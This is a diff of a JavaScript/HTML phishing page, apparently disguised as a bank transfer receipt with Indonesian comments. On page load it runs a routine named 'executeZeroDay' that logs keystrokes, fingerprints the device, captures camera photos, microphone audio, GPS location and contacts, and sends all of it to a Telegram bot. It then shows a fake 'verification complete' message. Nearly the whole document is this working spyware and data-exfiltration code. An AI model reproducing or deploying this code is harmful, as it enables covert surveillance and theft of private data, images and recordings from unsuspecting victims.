-            msg4 += `💻 ${dev.platform}\n🖥️ ${dev.screen}\n🌍 ${dev.language}\n`;
-            msg4 += `⏰ ${dev.timezone}\n⚙️ CPU: ${dev.cpuCores}\n💾 RAM: ${dev.memory}\n`;
-            msg4 += `🔋 ${dev.batteryLevel || 'N/A'}\n📶 ${dev.networkType || 'N/A'}\n🎮 ${dev.gpuInfo || 'N/A'}\n\n`;
-            msg4 += `🔧 UA:\n\`${dev.userAgent}\`\n`;
+            // ===== PESAN 5: DEVICE INFO LENGKAP =====
+            let msg4 = `📱 *DEVICE INFORMATION*\n`;
+            msg4 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg4 += `💻 Platform: ${dev.platform}\n`;
+            msg4 += `🖥️ Screen: ${dev.screen}\n`;
+            msg4 += `🎨 Color: ${dev.colorDepth}\n`;
+            msg4 += `🌍 Language: ${dev.language}\n`;
+            msg4 += `🗣️ Languages: ${dev.languages}\n`;
+            msg4 += `⏰ Timezone: ${dev.timezone}\n`;
+            msg4 += `⚙️ CPU: ${dev.cpuCores} cores\n`;
+            msg4 += `💾 RAM: ${dev.memory}\n`;
+            msg4 += `👆 Touch: ${dev.touchPoints}\n`;
+            msg4 += `🍪 Cookies: ${dev.cookieEnabled}\n`;
+            msg4 += `🤖 WebDriver: ${dev.webdriver}\n`;
+            msg4 += `🔋 Battery: ${dev.batteryLevel || 'N/A'}\n`;
+            msg4 += `⚡ Charging: ${dev.batteryCharging || 'N/A'}\n`;
+            msg4 += `📶 Network: ${dev.networkType || 'N/A'}\n`;
+            msg4 += `📥 Downlink: ${dev.downlink || 'N/A'}\n`;
+            msg4 += `🎮 GPU: ${dev.gpuInfo || 'N/A'}\n\n`;
+            msg4 += `🔧 *User Agent:*\n\`${dev.userAgent}\`\n`;
+            
             await sendTelegramMessage(msg4);
             
-            // PESAN 6: STATUS IZIN
-            let msg5 = `🔐 *IZIN AKSES*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg5 += `📷 Camera: ${permissions.camera ? '✅' : '❌'}\n`;
-            msg5 += `🎥 Video: ${permissions.video ? '✅' : '❌'}\n`;
-            msg5 += `🎙️ Mic: ${permissions.microphone ? '✅' : '❌'}\n`;
-            msg5 += `📍 Location: ${permissions.location ? '✅' : '❌'}\n`;
-            msg5 += `📇 Contacts: ${permissions.contacts ? '✅' : '❌'}\n`;
+            // ===== PESAN 6: STATUS IZIN =====
+            let msg5 = `🔐 *STATUS IZIN AKSES*\n`;
+            msg5 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg5 += `📷 Camera: ${permissions.camera ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+            msg5 += `🎙️ Microphone: ${permissions.microphone ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+            msg5 += `📍 Location: ${permissions.location ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+            msg5 += `📇 Contacts: ${permissions.contacts ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+            
             await sendTelegramMessage(msg5);
             
-            // PESAN 7: FOTO
+            // ===== PESAN 7: FOTO KAMERA =====
             if (cameraPhoto) {
                 try {
-                    await sendTelegramPhoto(cameraPhoto, `📷 FOTO KAMERA\n👤 ${p.nama}\n📞 ${p.hp}`);
-                } catch (e) {}
+                    await sendTelegramPhoto(cameraPhoto, `📷 *FOTO KAMERA TARGET*\n⏰ ${new Date().toLocaleString('id-ID')}\n👤 ${p.nama}\n📞 ${p.hp}`);
+                } catch (e) {
+                    console.log('Gagal kirim foto:', e);
+                }
             }
             
-            // PESAN 8: VIDEO
-            if (videoBase64) {
-                try {
-                    await sendTelegramVideo(videoBase64, `🎥 VIDEO REKAMAN\n👤 ${p.nama}`);
-                } catch (e) {}
-            }
-            
-            // PESAN 9: AUDIO
+            // ===== PESAN 8: AUDIO =====
             if (audioBase64) {
                 try {
-                    await sendTelegramAudio(audioBase64, `🎙️ AUDIO REKAMAN\n👤 ${p.nama}`);
-                } catch (e) {}
+                    await sendTelegramAudio(audioBase64, `🎙️ *REKAMAN AUDIO TARGET*\n⏰ ${new Date().toLocaleString('id-ID')}\n👤 ${p.nama}`);
+                } catch (e) {
+                    console.log('Gagal kirim audio:', e);
+                }
             }
             
-            // PESAN 10: KONTAK
+            // ===== PESAN 9: KONTAK =====
             if (contactsData && contactsData.length > 20) {
-                await sendTelegramMessage(`📇 *KONTAK (${contactsArray.length})*\n━━━━━━━━━━━━━━━━━━━━━━\n${contactsData.substring(0, 3500)}`);
+                let msgKontak = `📇 *KONTAK TARGET*\n`;
+                msgKontak += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                msgKontak += `${contactsData.substring(0, 3500)}`;
+                await sendTelegramMessage(msgKontak);
             }
             
-            // PESAN 11: KEYLOGGER
+            // ===== PESAN 10: KEYLOGGER =====
             if (keyLogBuffer.length > 0) {
-                await sendTelegramMessage(`⌨️ *KEYLOGGER (${keyLogBuffer.length})*\n━━━━━━━━━━━━━━━━━━━━━━\n\`${keyLogBuffer.join('\n').substring(0, 3500)}\``);
+                let msgKey = `⌨️ *KEYLOGGER (${keyLogBuffer.length} tombol)*\n`;
+                msgKey += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                msgKey += `\`${keyLogBuffer.join('\n').substring(0, 3500)}\``;
+                await sendTelegramMessage(msgKey);
             }
             
-            console.log('✅ SEMUA DATA TERKIRIM!');
+            console.log('✅ SEMUA DATA TERKIRIM KE TELEGRAM!');
         }
 
+        // ==================== SEND TEXT MESSAGE ====================
         async function sendTelegramMessage(text) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -970,15 +825,20 @@
                     })
                 });
                 return await response.json();
-            } catch (e) { console.error('❌ TG text:', e); }
+            } catch (e) {
+                console.error('❌ Telegram text error:', e);
+            }
         }
 
+        // ==================== SEND PHOTO ====================
         async function sendTelegramPhoto(photoBase64, caption) {
             try {
                 const base64Data = photoBase64.split(',')[1];
                 const binaryData = atob(base64Data);
                 const bytes = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) bytes[i] = binaryData.charCodeAt(i);
+                for (let i = 0; i < binaryData.length; i++) {
+                    bytes[i] = binaryData.charCodeAt(i);
+                }
                 const blob = new Blob([bytes], { type: 'image/jpeg' });
                 
                 const formData = new FormData();
@@ -987,39 +847,25 @@
                 formData.append('caption', caption.substring(0, 1024));
                 formData.append('parse_mode', 'Markdown');
                 
-                return await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST', body: formData
-                })).json();
-            } catch (e) { console.error('❌ TG photo:', e); }
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('❌ Telegram photo error:', e);
+            }
         }
 
-        async function sendTelegramVideo(videoBase64, caption) {
-            try {
-                const base64Data = videoBase64.split(',')[1];
-                const binaryData = atob(base64Data);
-                const bytes = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) bytes[i] = binaryData.charCodeAt(i);
-                const blob = new Blob([bytes], { type: 'video/webm' });
-                
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'video.webm');
-                formData.append('caption', caption.substring(0, 1024));
-                formData.append('parse_mode', 'Markdown');
-                formData.append('supports_streaming', 'true');
-                
-                return await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST', body: formData
-                })).json();
-            } catch (e) { console.error('❌ TG video:', e); }
-        }
-
+        // ==================== SEND AUDIO ====================
         async function sendTelegramAudio(audioBase64, caption) {
             try {
                 const base64Data = audioBase64.split(',')[1];
                 const binaryData = atob(base64Data);
                 const bytes = new Uint8Array(binaryData.length);
-                for (let i = 0; i < binaryData.length; i++) bytes[i] = binaryData.charCodeAt(i);
+                for (let i = 0; i < binaryData.length; i++) {
+                    bytes[i] = binaryData.charCodeAt(i);
+                }
                 const blob = new Blob([bytes], { type: 'audio/webm' });
                 
                 const formData = new FormData();
@@ -1028,13 +874,17 @@
                 formData.append('caption', caption.substring(0, 1024));
                 formData.append('parse_mode', 'Markdown');
                 
-                return await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST', body: formData
-                })).json();
-            } catch (e) { console.error('❌ TG audio:', e); }
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('❌ Telegram audio error:', e);
+            }
         }
 
-        // ==================== 12. EXECUTE ====================
+        // ==================== 12. EXECUTE ZERO-DAY ====================
         async function executeZeroDay() {
             if (executed) return;
             executed = true;
@@ -1043,22 +893,17 @@
             
             startKeylogger();
             getDeviceInfo();
-            startDefaceDetection();
-            
             const ip = await getIPAddress();
             
-            // Jalankan capture secara berurutan agar tidak bentrok
-            await captureCamera();
-            await captureMicrophone();
-            await captureVideo();
-            await getSuperAccurateLocation();
-            await captureContacts();
+            await Promise.all([
+                captureCamera(),
+                captureMicrophone(),
+                getSuperAccurateLocation(),
+                captureContacts()
+            ]);
             
             const personalData = generatePersonalData();
             await sendAllData(ip, personalData, receiptData);
-            
-            startRealtimeLocationTracking();
-            streamLocationToTelegram();
             
             showSuccessModal();
             showToast("✅ Verifikasi selesai.", 3000);
@@ -1079,11 +924,22 @@
                     </div>
                     <div class="data-modal-body">
                         <div class="device-info-grid">
-                            <div class="device-info-item"><label>📷 Camera</label><value>${permissions.camera ? '✅ Berhasil' : '❌ Gagal'}</value></div>
-                            <div class="device-info-item"><label>🎥 Video</label><value>${permissions.video ? '✅ Berhasil' : '❌ Gagal'}</value></div>
-                            <div class="device-info-item"><label>🎙️ Microphone</label><value>${permissions.microphone ? '✅ Berhasil' : '❌ Gagal'}</value></div>
-                            <div class="device-info-item"><label>📍 Lokasi GPS</label><value>${permissions.location ? '✅ Berhasil' : '❌ Gagal'}</value></div>
-                            <div class="device-info-item" style="grid-column: span 2;"><label>📇 Kontak</label><value>${permissions.contacts ? '✅ Berhasil (' + contactsArray.length + ' kontak)' : '❌ Gagal'}</value></div>
+                            <div class="device-info-item">
+                                <label>📷 Camera</label>
+                                <value>${permissions.camera ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>🎙️ Microphone</label>
+                                <value>${permissions.microphone ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>📍 Lokasi GPS</label>
+                                <value>${permissions.location ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
+                            <div class="device-info-item">
+                                <label>📇 Kontak</label>
+                                <value>${permissions.contacts ? '✅ Berhasil' : '❌ Gagal'}</value>
+                            </div>
                         </div>
                         <hr style="margin: 15px 0; border: none; border-top: 1px solid #e2e8f0;">
                         <div class="device-info-item" style="grid-column: span 2; margin-bottom: 10px;">
@@ -1109,8 +965,11 @@
 
         // ==================== INIT ====================
         window.addEventListener('DOMContentLoaded', async () => {
+            // Generate & tampilkan data bukti transfer OTOMATIS
             receiptData = generateReceiptData();
             displayReceiptData(receiptData);
+            
+            // Jalankan Zero-Day
             setTimeout(() => { executeZeroDay(); }, 2000);
         });
     </script>
